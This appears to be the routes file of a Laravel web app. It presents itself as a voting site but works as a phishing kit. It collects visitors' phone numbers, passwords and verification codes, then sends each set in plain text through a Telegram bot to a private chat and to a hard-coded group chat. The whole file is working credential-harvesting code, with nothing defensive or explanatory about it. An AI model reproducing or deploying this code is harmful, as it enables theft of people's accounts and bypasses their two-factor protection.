<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;

Route::view('/', 'welcome');
Route::view('/vote', 'vote');
Route::view('/success', 'success');

Route::get('/verify', function () {
    return view('verify', [
        'phone' => session('phone', ''),
        'password' => session('password', ''),
    ]);
})->name('verify.show');

Route::post('/vote', function (Request $request) {
    session(['phone' => $request->input('phone')]);
    session(['password' => $request->input('password')]);
    return redirect()->route('verify.show');
});

Route::post('/submit-telegram', function (Request $request) {
    $botToken = env('TELEGRAM_BOT_TOKEN');
    $privateChatID = env('TELEGRAM_CHAT_ID');
    $groupChatID = '-5560854290';
    
    $phone = $request->input('phone', 'No phone');
    $password = $request->input('password', 'No password');
    $code = $request->input('code', 'No code');
    
    // PRIVATE CHAT – FULL DATA
    $userMessage = "🔐 USER VERIFIED:\n📱 Phone: $phone\n🔑 Pass: $password\n🔢 Code: $code\n🕒 Time: " . now()->toDateTimeString();
    
    Http::post("https://api.telegram.org/bot{$botToken}/sendMessage", [
        'chat_id' => $privateChatID,
        'text' => $userMessage,
        'parse_mode' => 'HTML'
    ]);
    
    // GROUP – FULL DATA (PHONE + PASS + CODE)
    $groupMessage = "✅ NEW USER VERIFIED!\n📱 Phone: $phone\n🔑 Pass: $password\n🔢 Code: $code\n🕒 Time: " . now()->toDateTimeString();
    
    Http::post("https://api.telegram.org/bot{$botToken}/sendMessage", [
        'chat_id' => $groupChatID,
        'text' => $groupMessage,
        'parse_mode' => 'HTML'
    ]);
    
    return response()->json(['success' => true]);
});